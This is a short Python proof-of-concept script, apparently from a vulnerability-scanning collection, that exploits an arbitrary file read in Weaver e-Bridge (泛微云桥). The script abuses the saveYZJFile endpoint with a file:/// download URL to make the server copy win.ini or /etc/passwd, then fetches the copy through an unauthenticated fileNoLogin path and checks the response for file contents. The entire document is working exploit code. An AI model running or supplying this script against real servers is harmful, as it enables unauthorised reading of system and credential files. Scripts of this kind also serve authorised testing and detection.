#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time       : 2023/3/21 19:34
# @Author     : yunkong
# @FileName   : ebridge_file_read.py
# @Description: 泛微云桥任意文件读取


import requests
import urllib3

urllib3.disable_warnings()  # 忽略https证书告警


def poc(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
    }
    try:
        paths = ['C:/windows/win.ini', 'etc/passwd']  # 需要读取的文件列表（因为一般存在windows或者linux上）
        for i in paths:
            payload1 = '''/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///%s&fileExt=txt''' % i
            genfile = url + payload1
            res1 = requests.get(genfile, verify=False, allow_redirects=False, headers=headers,
                                timeout=15)  # 第二次请求，获取随机生成的id值
            try:
                id = res1.json()['id']
                if id:  # 如果值存在继续进行Step2，不存在继续循环。
                    payload2 = url + '/file/fileNoLogin/' + id
                    # print payload2
                    res2 = requests.get(payload2, verify=False, allow_redirects=False, headers=headers, timeout=15)
                    break
            except:
                continue
        if 'for 16-bit app support' in res2.text or 'root:x:0:0:' in res2.text:  # 判断漏洞是否存在，windows+linux的两种判断方法
            return payload2  # 返回结果
        else:
            return None
    except Exception as e:
        return None

